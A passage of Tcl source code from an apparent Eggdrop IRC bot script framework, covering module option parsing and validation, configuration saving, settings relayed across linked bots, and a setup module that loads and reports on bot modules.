	    set q "[unif_len [lindex $M 3] $L] :[c m] [unif_len $n $J($V)][c] -->"
	    if {$nl} { append q "[c m] \[something\][c]" } else {
		set k [expr $${V}($n)]
		if {[get_var_spec $m $vn type] == ""} { set k "{$k}" } ; set l [llength $k]
		for {set g 0} {$g < $l} {incr g} {
		    append q "[c m] [join [lindex $k $g]][c] [${m}_what_script $h $m $vn $n $g status],"
		}
		if {[get_var_spec $m $vn type] == "%p"} {
		    if {[get_var_spec $m $vn itype] == 1} {
			set q "[string range $q 0 [expr [string length $q] -2]]([c n]encrypted[c]),"
		    } else {
			set q "[string range $q 0 [expr [string length $q] -2]]([c n]plaintext[c]),"
		    }
		}
		set q [string range $q 0 [expr [string length $q] -2]]
		if {[string index $q [expr [string length $q] - 1]] == " "} {
		    set q [string range $q 0 [expr [string length $q] -2]]
		}
	    }
	    if {$z != ""} {
		if {[get_var_spec $m $vn rdonly]} { set K e } else { set K o }
		append q " (.$m [c $K]$vn[c])"
	    }
	    pa $i $q
	}
	set next $V
    }
    pa $i $Q
    if {$z != ""} {
	pa $i "Other commands without config entry: .$m [c o][b]help clear [module_commands $m noconf][b][c]"
    }
    pa $i "Type '[c m][b].help $m[b][c]' for command list and more.."
    if {$z == ""} { pa $i "Or.. '[c m][b].$m -v[b][c]' for quick command list! ;)" }
}

proc module_commands {m {w ""}} {
    set mi ${m}_module_init ; set mn ${m}_noconf_commands ; global $mi $mn
    set a [expr $${mi}] ; set n [expr $${mn}] ; set c ""
    switch -exact $w {
	"all" {
	    foreach M $a { lappend c [get_var_name [lindex $M 0]] }
	    foreach M $n { lappend c [lindex $M 0] }
	}
	"noconf" { foreach M $n { lappend c [lindex $M 0] } }
	"single" { foreach M $n { if {[lindex $M 1] != "" && [lindex $M 1] != 0} { lappend c [lindex $M 0] } } }
	default { foreach M $a { lappend c [get_var_name [lindex $M 0]] } }
    }
    return $c
}

proc strip_blocking {s} {
    set r ""
    foreach w $s {
	if {[string match "_*" $w]} { append r "[string range $w 1 end] " } else { append r "$w " }
    }
    return [string range $r 0 [expr [string length $r] -2]]
}

set valid_flags [split "abcdefghijklmnopqrstuvwxyz" ""]
set valid_flags "- $valid_flags [stru $valid_flags]"

proc parse_flags {f} {
    global valid_flags
    if {$f == "permowner"} { return "ok" }
    if {$f == "" || ([string length $f] > 1 && ![string match "*|*" $f])} { return $f }
    set f [split $f |] ; set g [lindex $f 0] ; set l [lindex $f 1]
    foreach f "$g $l" {
	if {[string length $f] > 1} { return $f }
	if {[lsearch -exact $valid_flags $f] == -1} { return $f }
    }
    return "ok"
}

proc validnick {n} {
    global nick-len
    if {[string length $n] > ${nick-len}} { return 0 }
    if {[string match *[string index $n 0]* "0123456789\(\):\#*$%&/!\"£"]} { return 0 }
    return 1
}

proc parse_options_scan {m v p n {t ""} {r ""} {w ""}} {
    set V ${m}_${v} ; global $V ; append V "(all)"
    switch -exact $t {
	"%d" {
	    if {$w == ""} { set w "number" } ; set q "{$w\#}"
	    if {$r != ""} {
		set r [split $r |] ; set rn [lindex $r 0] ; set rv [strip_blocking [lindex $r 1]]
		if {$n == 0 && [info exists $V]} {
		    if {$rv == ""} { set rv "all"} else { set rv "all $rv" }
		}
		set rn0 [lindex $rn 0] ; set rn1 [lindex $rn 1] ; set Q ""
		if {$rn0 != "" && $rn1 != ""} {
		    set Q "Valid range for [c m][lindex $w end]\#[c]:[c m] $rn0[c] -[c m] $rn1[c]"
		}
		if {$rv != ""} { regsub -all " " $rv " [c]/[c m] " rv ; append Q " or '[c m]$rv[c]'" }
		if {$Q != ""} { append q " {$Q}" } ; set w $q
	    }
	}
	"%k" - "%s" {
	    set w [strip_blocking $r] ; if {$n == 0 && [info exists $V]} { set w "all $w" }
	    regsub -all " " $w " [c]/[c m] " w; if {$t == "%s"} { regsub -all "/" $w "/+" w }; set w "{$w}"
	}
	"%f" {
	    if {$w == ""} { set w "flag global[b]|[b]local - permowner" }
	    if {$n == 0 && [info exists $V]} { set w "all $w" }
	    regsub -all " " $w " [c]/[c m] " w ; set w "{$w}"
	}
	"%l" {
	    if {$w == ""} { set w "filename" } ; if {$r != ""} { set w "$w $r" }
	    if {$n == 0 && [info exists $V]} { set w "all $w" }
	    regsub -all " " $w " [c]/[c m] " w ; set w "{$w}"
	}
	"%c" {
	    if {$w == ""} { set w "\#channel" } ; if {[info exists $V]} { set w "all / $w" } ; set w "{$w}"
	}
	"%n" {
	    if {$w == ""} { set w "nickname" } ; if {[info exists $V]} { set w "all / $w" }
	    if {$r != ""} { set w "$w $r" } ;  regsub -all " " $w " [c]/[c m] " w ; set w "{$w}"
	}
	"%p" {
	    if {$w == ""} { set w "password" } ; if {[info exists $V]} { set w "all / $w" }
	    if {$r != ""} { set w "$w $r" } ; regsub -all " " $w " [c]/[c m] " w ; set w "{$w}"
	}
	default {
	    if {$w == ""} { if {$p} {set w "newvalue"} else { set w "\#channel" } }
	    if {[info exists $V]} { set w "all / $w" } ; set w "{$w}"
	}
    }
    return "{$w}"
}

proc parse_options_check {m v i n t r w p} {
    proc parse_output {m i v x} {
	if {$i == 0 || $i == ""} { al $m "$x" } else {
	    module_show $i $m $v ; pa $i [string repeat "-" 30] ; pa $i $x
	}
    }
    set V ${m}_${v} ; global $V valid_flags ; append V "(all)"
    switch -exact $t {
	"%d" {
	    set r [split $r |] ; set rn [lindex $r 0] ; set rv [strip_blocking [lindex $r 1]]
	    if {$n == 0 && [info exists $V]} { set rv "all $rv" }
	    if {[lsearch -exact $rv $p] != -1} { return 1 }
	    set rn0 [lindex $rn 0] ; set rn1 [lindex $rn 1] ; set Q ""
	    if {[string trim $p "0123456789"] != "" || (($rn0 != "" && $rn1 != "") && ($p < $rn0 || $p > $rn1))} {
		set q "[c e][b]Invalid parameter[b][c]" ; if {$w != ""} { append q " for[c m] $w\#[c]" }
		append q ": '[c e][b]$p[b][c]'. Please, enter a numerical value"
		if {$rn0 != "" && $rn1 != ""} {
		    append q " in the range [c o][b]$rn0[b][c] - [c o][b]$rn1[b][c]"
		}
		if {$rv != ""} {
		    regsub -all " " $rv " [c][b]/[b][c o] " rv ; append q " or '[c o][b]$rv[b][c]'"
		}
		append q ".." ; parse_output $m $i $v $q ; return 0
	    }
	    return 1
	}
	"%k" - "%s" {
	    if {$n == 0 && [info exists $V]} { set r "all $r" } ; set r [strip_blocking $r]
	    if {$t == "%s"} { set p [split $p ,] }
	    foreach P $p {
		if {[lsearch -exact $r $P] == -1} {
		    set q "Invalid parameter: '[c e][b]$P[b][c]'. Valid options are: '[c o][b]"
		    regsub -all " " $r " [c][b]/[b][c o] " r ; append q "$r[b][c]'"
		    parse_output $m $i $v $q ; return 0
		}
	    }
	    return 1
	}
	"%f" {
	    if {$n == 0 && [info exists $V]} { set r "all $r" } ; set P [parse_flags $p]
	    if {$P != "ok"} {
		set q "Invalid flags: '[c e][b]$P[b][c]'. Valid flags are: '[c o][b]$valid_flags[b][c]' or '[c o][b]permowner[b][c]'"
		parse_output $m $i $v $q ; return 0
	    }
	    return 1
	}
	"%l" {
	    if {$n == 0 && [info exists $V]} { set r "all $r" }
	    if {([file exists $p] && [file readable $p]) || [lsearch -exact $r $p] != -1} { return 1 }
	    set q "File '[c e][b]$p[b][c]' "
	    if {![file exists $p]} { append q "does not exists.." } else { append q "is not readable.." }
	    parse_output $m $i $v $q ; return 0
	}
	"%c" {
	    if {[validchan $p] || ([info exists $V] && $p == "all")} { return 1 }
	    set q "Invalid channel: '[c e][b]$p[b][c]'.." ; parse_output $m $i $v $q ; return 0
	}
	"%n" {
	    if {[validnick $p] || ([info exists $V] && $p == "all")} { return 1 }
	    set q "Invalid nickname: '[c e][b]$p[b][c]'.." ; parse_output $m $i $v $q ; return 0
	}
	default { return 1 }
    }
}

proc blocking_param {m v r p} {
    set V ${m}_${v} ; global $V ; append V "(all)"
    if {[string match "*|*" $r]} { set r [lindex [split $r |] 1] }
    if {[info exists $V]} { set r "_all $r" } ; set b ""
    foreach R $r { if {[string index $R 0] == "_"} { append b "[string range $R 1 end] " } }
    if {[lsearch -exact $b $p] != -1} { return 1 } else { return 0 }
}

proc alt_param {m v r p} {
    if {![string match "*|*" $r]} { return 0 } ; set r [strip_blocking [lindex [split $r |] 1]]
    set V ${m}_${v} ; global $V ; append V "(all)" ; if {[info exists $V]} { set r "all $r" }
    if {[lsearch -exact $r $p] != -1} { return 1 } else { return 0 }
}

proc parse_options {m v {i ""} {p ""}} {
    set o [split [get_var_spec $m $v kind] :] ; if {[valididx $i]} { set h [idx2hand $i]} else { set h "" }
    if {[lsearch -exact [module_array_vars $m] $v] != -1 } { set a 1 } else { set a 0 }
    if {$a} { set c [lindex $p 0] ; set p [lrange $p 1 end] } else { set c "" }
    set t [lindex $o 0] ; set r [lindex $o 1] ; set T [split $t ,] ; set R [split $r ,]
    set q "" ; set l [llength $T] ; if {$l < 1} { set l 1 }
    for {set j 0} {$j < $l} {incr j} {
	set W [${m}_what_script $h $m $v $c $j parse]
	if {$i == ""} {
	    append q "[parse_options_scan $m $v 1 $j [lindex $T $j] [lindex $R $j] $W] "
	} else {
	    if {![parse_options_check $m $v $i $j [lindex $T $j] [lindex $R $j] $W [lindex $p $j]]} {
		return 0
	    }
	    set q 1 ; if {[blocking_param $m $v [lindex $R $j] [lindex $p $j]]} { break }
	}
    }
    if {$a} {
	set t [lindex $o 2] ; set r [lindex $o 3]
	if {$i == ""} {
	    set q "[parse_options_scan $m $v 0 0 $t $r ""] $q"
	} else {
	    if {![parse_options_check $m $v $i $j $t $r "" $c]} { set q 0 }
	}
    }
    return $q
}

proc do_clear {m b h} {
    set c ${m}_module_conf ; global $c ; file delete -force [expr $${c}]
    return "Removed [module_name $m] Configuration File"
}

proc module_info {h m w c {I ""}} {
    if {$w == "clear"} { set x [do_clear $m [lindex $c 0] [lindex $c 1]] ; return "{{$x}} {} {}" }
    set mi ${m}_module_init; set W ${m}_$w; global $mi $W; set a [expr $${mi}]; set x "" ; set X ""
    proc x_init {m M} { return "[lindex $M 3] is: " }
    set nl [expr 1 - [flagged $h [split [get_var_spec $m $w nolog] |]]]
    foreach M $a {
	set v [lindex $M 0]
	if {[get_var_name $v] == $w} {
	    set x [x_init $m $M]
	    if {[get_var_name $v] == $v} {
		if {$nl} { append x "[c m][b]\[something\][b][c], " } else {
		    set k [expr $${W}] ; if {[get_var_spec $m $w type] == ""} { set k "{$k}" }
		    set l [llength $k]
		    for {set g 0} {$g < $l} {incr g} {
			append x "[c m][b][lindex $k $g][b][c] [${m}_what_script $h $m $w "" $g info], "
		    }
		    if {[get_var_spec $m $w type] == "%p"} {
			if {[get_var_spec $m $w itype] == 1} {
			    set x "[string range $x 0 [expr [string length $x] -3]] ([c n]encrypted[c]), "
			} else {
			    set x "[string range $x 0 [expr [string length $x] -3]] ([c n]plaintext[c]), "
			}
		    }
		}
		append X "{[string range $x 0 [expr [string length $x] -3]]} " ; break
	    }
	    set V ${m}_${w} ; global $V ; append V "(all)"
	    if {$c == ""} {
		if {[info exists $V]} {
		    set c "all" ; foreach C [array names $W] { if {$C != "all"} { lappend c $C } }
		} else {
		    foreach C [array names $W] { lappend c $C }
		}
	    } elseif {![info exists ${W}($c)]} {
		if {[info exists $V]} { set c "all" } else { set c [lindex [array names $W] 0] }
	    }
	    set J [max:length $c]
	    foreach C $c {
		if {$nl} { append x "[c m][b]\[something\][b][c], " } else {
		    set k [expr $${W}($C)] ; if {[get_var_spec $m $w type] == ""} { set k "{$k}" }
		    set l [llength $k] ; append x "[c m][b][unif_len $C $J][b][c] --> "
		    for {set g 0} {$g < $l} {incr g} {
			append x "[c m][b][lindex $k $g][b][c] [${m}_what_script $h $m $w $C $g info], "
		    }
		    if {[get_var_spec $m $w type] == "%p"} {
			if {[get_var_spec $m $w itype] == 1} { set Q "encrypted" } else { set Q "plaintext"}
			set x "[string range $x 0 [expr [string length $x] -3]] ([c n]$Q[c]), "
		    }
		}
		append X "{[string range $x 0 [expr [string length $x] -3]]} " ; set x [x_init $m $M]
	    }
	    break
	}
    }
    set y "" ; set z [lindex $M 6] ; if {[get_var_spec $m $w rdonly]} { return "{$X} {} {}" }
    if {$I != ""} {
	set o [parse_options $m $w "" $c] ; set y "Use '[c o].$m $w[c]" ; set k ""
	foreach j $o {
	    regsub -all " / " [lindex $j 0] " [c]/[c m] " O ; append y " <[c m]$O[c]>"
	    set O [lindex $j 1] ; if {$O != ""} { append k " {$O}" }
	}
	set y "{$y' to change..}" ; foreach K $k { append y " {$K}" }
    }
    if {$z != ""} { set z "[c n]$z[c]" } ; return "{$X} {$y} {$z}"
}

proc module_show {i b k} {
    set m [get_module_from_bind $b] ; set h [idx2hand $i] ; global pa bnick
    set pa($i) $m ; set w [lindex $k 0] ; set c [lindex $k 1]
    switch -exact $w {
	"help" { dccsimul $i ".$w $m" ; return 1 }
	default {
	    if {$w == "clear"} { set c "$bnick $h" } ; set r [module_info $h $m $w $c 1]
	    set x [lindex $r 0] ; set y [lindex $r 1] ; set z [lindex $r 2]
	}
    }
    if {$m == $b} {
	foreach X $x { pa $i [join $X] }
	if {$y != ""} { foreach Y $y { pa $i $Y } } ; if {$z != ""} { pa $i $z }
    } else {
	foreach X $x { bot:module_interface $bnick 0 "$h $i module_status_report $X" }
    }
}

proc module_save {m} {
    set mi ${m}_module_init; set mc ${m}_module_conf; global $mi $mc; set a [expr $${mi}]
    set f [open [expr $${mc}] w] ; set next ""
    foreach M $a {
	if {[lindex $M 0] == "author"} { continue }
	set v ${m}_[lindex $M 0] ; set V [get_var_name $v] ; global $V ; if {$next == $V} { continue }
	set w [string range $V [expr [string first "_" $V] + 1] end]
	if {$V == $v} {
	    if {[get_var_spec $m $w type] == "%p" && [get_var_spec $m $w itype] == 1} {
		set $v [encrypt [expr $${v}] [expr $${v}]]
	    }
	    puts $f "set $v \"[p_test [expr $${v}]]\"" ; continue
	}
	foreach n [array names $V] {
	    set l [expr $${V}($n)] ; set N [get_var_name [lindex $M 0]]
	    if {$l == "all"} {
		if {$n != "all"} {
		    if {[info exists ${V}($n)]} { unset ${V}($n) ; continue }
		} else {
		    set ${V}($n) [get_var_spec $m $N value]
		}
	    } else {
		if {$n != "all" && ([get_var_spec $m $N itype] == "%c" && ![validchan $n])} {
		    if {[info exists ${V}($n)]} { unset ${V}($n) ; continue }
		}
	    }
	    if {[get_var_spec $m $w type] == "%p" && [get_var_spec $m $w itype] == 1} {
		set ${V}($n) [encrypt $l $l]
	    }
	    puts $f "set ${V}($n) \"[p_test [expr $${V}($n)]]\""
	}
	set next $V
    }
    close $f
}

proc module_save_changes {h i m l G g w p a} {
    global bnick ; eval [module_globals $m]
    set v ${m}_$w ; set q "[module_name $m] '[c m][get_var_spec $m $w desc][c]' "
    if {[get_var_spec $m $w nolog] == "-"} { set nl 0 } else { set nl 1 }
    if {$nl} { append q "[c m][b]changed[b][c]" } else { append q "set to: " }
    if {[lsearch -exact $a $w] != -1} {
	if {!$nl} { append q "[c m][b][bi $p 0][b][c] --> " }
	set c [strl [bi $p 0]] ; set P [br $p 1 end]
	if {$l == 0 || [lsearch -exact [strl $G] [strl $bnick]] != -1} { set ${v}($c) "$P" }
    } else {
	set c "" ; set P [br $p 0 end]
	if {$l == 0 || [lsearch -exact [strl $G] [strl $bnick]] != -1} { set ${m}_$w "$P" }
    }
    if {[get_var_spec $m $w type] == ""} { set P "{$P}" }
    if {!$nl} {
	set L [llength $P]
	if {$P != "all" || ($P == "all" && ! [info exists ${v}(all)])} {
	    for {set j 0} {$j < $L} {incr j} {
		append q "[c m][b][lindex $P $j][b][c] [${m}_what_script $h $m $w $c $j info], "
	    }
	    set q [string range $q 0 [expr [string length $q] -3]]
	    if {[string index $q [expr [string length $q] - 1]] == " "} {
		set q [string range $q 0 [expr [string length $q] -2]]
	    }
	} else { append q "[c m][b]$P[b][c]" }
    }
    if {$l} {
	if {[strl $g] == [strl $bnick]} { set Q "" } else { set Q "on $g" }
	if {$Q != ""} { append q " $Q" } ; append q ": Authorized by $h."
    } else { append q ": requested by $h (from $G)" }
    module_save $m ; al $m $q
}

proc module_get_bots {g} {
    global bnick
    if {[string length $g] == 1} {
	set g [stru $g]
	if {$g == "A"} {
	    set G "$bnick [bots]"
	} else { set G "" ; foreach b "$bnick [bots]" { if {[matchattr $b $g]} { lappend G $b } }}
    } elseif {[string match "*,*" $g]} { set G [split $g ,] } else { set G $g }
    return $G
}

proc module_scan_interface {i l g G w p} {
    global bnick ; set m [get_module_from_bind $l]
    if {[lsearch -exact "help clear " $w] != -1 || [get_var_spec $m $w rdonly]} {
	set p "" ; if {$w == "help"} { set g $bnick ; set G $g }
    }
    if {[lsearch -exact [module_commands $m noconf] $w] == -1 && ($p == "" || ([bi $p 1] == "" && [lsearch -exact [module_array_vars $m] $w] != -1))} {
	if {[lsearch -exact "help clear [module_commands $m]" $w] == -1} {
	    module_usage $i $m 0 $w 1 ; return 1
	}
	if {$w != "help"} {
	    if {$m != $l} { putcmdlog "\#[idx2hand $i]\# $l $g $w $p"
	    } else { putcmdlog "\#[idx2hand $i]\# $m $w $p" }
	}
	foreach b $G {
	    if {![islinked $b] && [strl $b] != [strl $bnick]} {
		pa $i "Sorry, I can't find '[b]$b[b]' as a linked bot.."
	    } else {
		if {[strl $b] == [strl $bnick]} {
		    module_show $i $l "$w $p"
		} else {
		    if {[lsearch -exact "help" $w] == -1} {
			putbot $b "$m [idx2hand $i] $i $w module_status_request $p"
		    }
		}
	    }
	}
	return 1
    }
    return 0
}
proc linked_bots {i g} {
    global bnick ; set G ""
    foreach b $g {
	if {![islinked $b] && [strl $b] != [strl $bnick]} {
	    pa $i "Bot '[c e][b]$b[b][c]' is [c e]not linked[c]: skipping.."
	} else { lappend G $b }
    }
    return $G
}

proc module_send {i m g G w p} {
	global bnick ; set h [idx2hand $i] ; set g1 ""
	if {[lsearch -exact [module_commands $m single] $w] != -1} { set g $bnick ; set G $g }
	if {$g == "A"} {
		set g1 "ALL connected bots"; ${m}_module_setup $h $i $m 1 $G $g1 $w $p; putallbots "$m $h $i $w $p"
	} else {
		if {[string length $g] == 1} {
			set g1 "[stru $g] bots"
		} else { set G [linked_bots $i $G] ; regsub -all " " $G , g1 }
		${m}_module_setup $h $i $m 1 $G $g1 $w $p
		foreach b $G { if {[strl $b] == [strl $bnick]} { continue } ; putbot $b "$m $h $i $w $p" }
	}
}

proc module:trim:args {m w a} {
    set A [lsearch -exact [module_array_vars $m] $w] ; set n [llength [split [get_var_spec $m $w type] ,]]
    if {$A == -1} { set b 0 } else { set b 1 }
    if {$n == 0} { set e "end" } else { set e [expr $b + $n - 1] } ; return [br $a 0 $e]
}

proc dcc:module_interface {h i a} {
	global pa bnick lastbind ; set m [get_module_from_bind $lastbind]
	set pa($i) $m ; global ${m}_module_bind ; eval [module_globals $m]
	if {$lastbind == "m$m"} {
		set g [bi $a 0]; set cm [strl [bi $a 1]] ; set p [module:trim:args $m $cm [p_test [br $a 2 end]]]
		if {$cm == ""} { module_usage $i $m 1 ; return 0 }
	} else {
		set g $bnick ; set cm [strl [bi $a 0]] ; set p [module:trim:args $m $cm [p_test [br $a 1 end]]]
		if {$cm == "" || $cm == "-v"} { module_status $i $m $cm ; return 0 }
	}
	if {[lsearch -exact [module_array_vars $m] $cm] != -1} { set p "[strl [bi $p 0]] [br $p 1 end]" }
	set G [module_get_bots $g] ; if {[module_scan_interface $i $lastbind $g $G $cm $p]} { return 0 }
	if {[lsearch -exact [module_commands $m single] $cm] != -1} {
		set lastbind $m ; set g $bnick ; set G $g
	}
	if {$lastbind != $m && ![matchattr $h n]} {
		pa $i "Sorry, only global owners can change botnet settings.." ; return 0
	}
	if {![flagged $h [split ${m}_module_bind "|"]]} {
		pa $i "Sorry, only +[b]${m}_module_bind[b] flagged users can change [module_name $m] settings.." ; return 0
	}
	if {[lsearch -exact "help [module_commands $m all]" $cm] == -1} { module_usage $i $m 0 $cm ; return 0 }
	if {$lastbind != $m} { set log "$lastbind $g $cm" } else { set log "$m $cm" }
	set o [get_var_spec $m $cm of]
	if {$o != "" && ![flagged $h [split $o "|"]]} {
		pa $i "Sorry, only [c n][b]$o[b][c] flagged users can change [module_name $m] settings.."; return 0
	}
	if {[lsearch -exact [module_commands $m noconf] $cm] == -1 && ![parse_options $m $cm $i $p]} { return 0 }
	if {[get_var_spec $m $cm nolog] != "-"} { set q "\[...\]" } else { set q [join $p] }
	putcmdlog "\#$h\# $log $q" ; module_send $i $m $g $G $cm $p
}

proc bot:module_interface {b cm a} {
    global bnick lastbind ; set m [get_module_from_bind $lastbind]
    set h [bi $a 0] ; set i [bi $a 1] ; set w [bi $a 2] ; set p [lrange $a 3 end]
    if {$w == "module_status_report"} {
	if {![valididx $i] || [strl [idx2hand $i]] != [strl $h]} { return 0 }
	#set p [string range $p [expr [string first : $p] + 2] end]
	putdcc $i "[boja] \[[c m]$m[c]\] \[[c o]from [unif_len $b 9][c]\] - [join $p]" ; return 0
    }
    global ${m}_module_bind ; eval [module_globals $m] ; set A [module_array_vars $m]
    if {[lindex $p 0] == "module_status_request"} {
	set c [lindex $p 1] ; set Q ""
	if {[lsearch -exact $A $w] != -1 && $c != "" } { set Q "for '[c m]$c[c]'" }
	if {$w == "clear"} { set c "$b $h" }
	set r [lindex [module_info $h $m $w $c] 0]
	foreach R $r { putbot $b "$m $h $i module_status_report $R" }
	set q "[module_name $m] replied to '[c m][get_var_spec $m $w desc][c]' request"
	if {$Q != ""} { append q " $Q" } ; append q " made by $h (from $b)" ; al $m $q ; return 0
    }
    if {[lsearch -exact [module_commands $m noconf] $w] == -1 && ![parse_options $m $w 0 $p]} {
	al $m "[module_name $m] failed trying to set '[c m][get_var_spec $m $w desc][c]' as requested by $h (from $b)" ; return 0
    }
    ${m}_module_setup $h $i $m 0 $b $bnick $w $p
}
proc local:for:me {G} {
    global bnick ; if {[lsearch -exact [strl $G] [strl $bnick]] == -1} { return 0 } else { return 1 }
}
proc module_init {m} {
    set mi ${m}_module_init ; set mc ${m}_module_conf ; set mb ${m}_module_bind
    global wpref $mi $mc $mb ; set i [expr $${mi}]
    foreach l $i { set v ${m}_[lindex $l 0] ; set V [get_var_name $v] ; global $V ; set $v [lindex $l 2] }
    set v ${m}_ver ; set ver [expr $${v}] ; if {![info exists $mc]} { set $mc "$wpref.$m" }
    if {![file exists [expr $${mc}]]} {
	al init "[module_name $m] configuration file not found : generating default.. ;)" ; module_save $m
    } else { source [expr $${mc}] }
    if {[expr $${v}] != $ver} {
	al init "[module_name $m] version changed: upgrading to version $ver..";set $v $ver; module_save $m
    }
    source [expr $${mc}] ; set b [expr $${mb}]
    bind dcc $b $m dcc:module_interface ; bind dcc $b m$m dcc:module_interface
    bind bot b $m bot:module_interface
}
proc module:report {m l y G h i r} {
	global bnick
	if {$l} {
		if {[lsearch -exact [strl $G] [strl $bnick]] == -1} { return 0 }
		bot:module_interface $bnick 0 "$h $i module_status_report $r"
	} else {
		putbot $G "$m $h $i module_status_report $r"
	}
}

if {![info exists help-path]} { global help-path }
if {[file isdirectory ${help-path}]} {
    set smarthelp [file join ${help-path} smart.help]
} else {
    set smarthelp "smart.help"
}
set setup_rehashing 1 ; source "$wdir/smart.setup.tcl" ; setup:hash ; setup:load ; setup:save
utimer 2 reloadhelp ; al done "This bot is running advanced [boja] TCL version [b][rv][b] by [b]^Boja^[b]"
}
set smart_setup {set m "setup"
global bnick ${m}_module_name ${m}_module_init ${m}_module_bind ${m}_module_loaded ${m}_noconf_commands
set ${m}_module_name "TCL Setup System"
set ${m}_module_bind "m|m"
set ${m}_help_list "{dcc $m m|m} {dcc m${m} m|m} {dcc pack n}"
# All module vars: {0=name 1=read-only 2=value 3=description 4=kind 5=override 6=notes 7=no-log}
set ${m}_module_init {
    {ver 1 "2.5" "Version"}
    {author 1 "^Boja^ <boja@avatarcorp.org>" "Author"}
    {pmods 1 "setup sop prot nick" "Primary Modules"}
    {amods 1 "setup sop prot nick bind bnc rep logs clone take spam ainv cron color help" "Smart Modules"}
    {umods 1 "" "User Modules"}
    {want(setup) 1 1 "Wanted Module"}
}
# format: {command single-only-interface_flag no-logs_flag}
set ${m}_noconf_commands {
    load unload info loaded unloaded status +module -module
}

module_init $m ; eval [module_globals $m] ; proc ${m}_what_script {h m v a n w} { return "" }

proc $m:mods {} { global setup_amods setup_umods ; return "$setup_amods $setup_umods" }
proc $m:want:update {} {
    set m setup ; set w ${m}_want ; global $w ${m}_umods
    foreach M [$m:mods] { if {![info exists ${w}($M)]} { set ${w}($M) 1 } }
    foreach M [array names $w] { if {[lsearch -exact [$m:mods] $M] == -1} { lappend ${m}_umods $M } }
}

proc $m:hash {{w ""}} {
    global wdir wpref help-path
    if {$w == ""} {
	set M [setup:mods] ; global splits_module_conf ; set splits_module_conf "$wpref.splits"
    } else { set M $w }
    foreach m $M {
	set c ${m}_module_conf ; set l ${m}_module_loaded ; set s ${m}_module_script ; set h ${m}_help_file
	global $c $l $s $h ; set $s "$wdir/smart.$m.tcl" ; set $c "$wpref.$m"
	set $h [file join ${help-path} smart.$m.help] ; if {![info exists $l]} { set $l 0 }
    }
}

proc $m:load {{w ""}} {
    global setup_want setup_rehashing
    if {$w == ""} {
	set mo [setup:mods] ; set n [lsearch -exact $mo "help"]
	if {$n != -1} { set mo [lreplace $mo $n $n] ; lappend mo "help" }
    } else { set mo $w }
    foreach m $mo {
	set S ${m}_module_script ; set H ${m}_help_file ; global $S $H
	if {$setup_want($m)} {
	    if {![file exists [expr $${S}]]} {
		set q "Could not load module [b]$m[b]: file not found: '[expr $${S}]'"
		append q " (see '.setup' for details..)" ; al "[c e]setup[c]" $q ; continue
	    }
	    set M $m ; set h [expr $${H}]
	    if {[info exists setup_rehashing]} { unset setup_rehashing } else {
		catch "source [expr $${S}]" e
		if {[string length $e] > 2} {
		    al "[c e][b]error[b][c]" "[c e][b]Warning!!![b][c] Error trying to load module '[c e][b]$M[b][c]'!"
		    al "[c e][b]error[b][c]" "See '[c e].probe[c]', '[c e].probe log[c]', '[c e].botver[c]' and email the author!"
		}
	    }
	    if {[file exists $h] && $setup_want(help)} { loadhelp smart.$M.help }
	} else {
	    # Unload modules ..
	    unloadhelp smart.$m.help
	}
    }
}

proc $m:save {{w ""}} {
    setup:want:update ; module_save setup ; if {$w != ""} { setup:hash $w ; setup:load $w }
}

proc setup:info {m {v ""} {l ""} {L ""}} {
    set D ${m}_module_loaded ; global wdir $D setup_amods setup_pmods help-path modules_interface_ver
    if {$v == ""} { set v 0 } ; set q [get:module:status exists $m]
    if {[string match "Unknown*" $q]} { return $q } ; set f "$wdir/smart.$m.tcl"
    set q "Module [c m][b][unif_len $m $l][b][c]: [unif_len [module_name $m] $L]:"
    if {![expr $$D]} { append q " [c e][b]not[b][c]" } ; append q " [c o][b]loaded[b][c] ( "
    if {[file exists $f]} { set Q [expr round([file size $f]/1024)] } else {  set Q "??" }
    if {$m == "help"} {
	set ms 0
	foreach M [setup:mods] {
	    if {$M != "help"} {
		set mh [file join ${help-path} smart.$M.help] ; set ml ${m}_module_loaded ; global $ml
		if {[file exists $mh] && [expr $${ml}]} {
		    set ms [expr $ms + [expr round([file size $mh]/1024)]]
		}
	    }
	}
	if {$Q == "??"} { set S $Q } else { set S [expr $Q + $ms] }
	append q "$S Kb: $Q Kb core + $ms kb modules"
    } else { append q "[unif_len $Q 2 r] Kb" }
    if {$v} {
	if {[lsearch -exact $setup_amods $m] != -1} { append q ", Smart Module"
	} else {
	    append q ", User module" ; set a [get_module_author $m]
	    if {$a != ""} { append q ", Author: $a" }
	}
	append q ", Relevance: "
	if {[lsearch -exact $setup_pmods $m] != -1} { append q "Primary"} else { append q "Secondary" }
	set mi ${m}_module_init ; global $mi ; set Q "Interfaces"
	if {[expr $$D]} {
	    if {[info exists $mi]} { set Q "$Q v $modules_interface_ver" } else { set Q "Non-Standard $Q" }
	} else {
	    set Q "Unknown $Q"
	}
	append q ", $Q"
    }
    append q " )" ; return $q
}

proc setup:status {i} {
    set m "setup" ; eval [module_globals $m] ; global pa wdir bnick modules_interface_ver
    set pa($i) $m ; set l 0 ; set L 0
    foreach M [$m:mods] {
	set k [string length $M] ; set K [string length [module_name $M]]
	if {$k > $l} { set l $k } ; if {$K > $L} { set L $K }
    }
    set j "TCL v [rv] - Setup v [c l]$setup_ver[c] - Modules Interface v [c l]$modules_interface_ver[c]"
    set Q [expr [string length $j] -11] ; set k "[c l]Smart Modules[c]"
    set q [string repeat "-" [expr ($Q - [string length $k] + 4)/2 -1]]
    set q "$q $k $q" ; pa $i $j ; pa $i $q
    foreach M [expr $${m}_amods] { pa $i [setup:info $M 0 $l $L] } ; set k "[c l]User Modules[c]"
    set q [string repeat "-" [expr ($Q - [string length $k] + 4)/2 -1]]; set q "$q $k $q"; pa $i $q
    foreach M [expr $${m}_umods] { pa $i [setup:info $M 0 $l $L] } ; pa $i [string repeat "-" $Q]
    pa $i "Available commands: [c l].$m[c] [c o][b]help clear [module_commands $m noconf][b][c]"
    pa $i "Type '[c m][b].help $m[b][c]' for command list and more.."
}

proc get:module:status {s {m ""}} {
    set l ${m}_module_loaded ; global $l setup_ver ; set r ""
    if {$m == "" && $s != "status"} {
	foreach M [setup:mods] { if {[get:module:status $s $M]} { lappend r "$M" } }
	if {$r == ""} { set r "<none>" }
	if {$s == "loaded"} { set q "L" ; set c o } else { set q "Unl" ; set c e }
	return "[c m]${q}oaded Modules:[c][c $c] $r[c]"
    }
    switch -exact -- $s {
	"exists" {
	    if {[lsearch -exact [setup:mods] $m] == -1} {
		set r "Unknown Module: '[c e][b]$m[b][c]'. Setup v [c l]$setup_ver[c], TCL v [rv]. Need '[c l].upgrade[c]'? :)"
	    } else { set r "yes" } ; return $r
	}
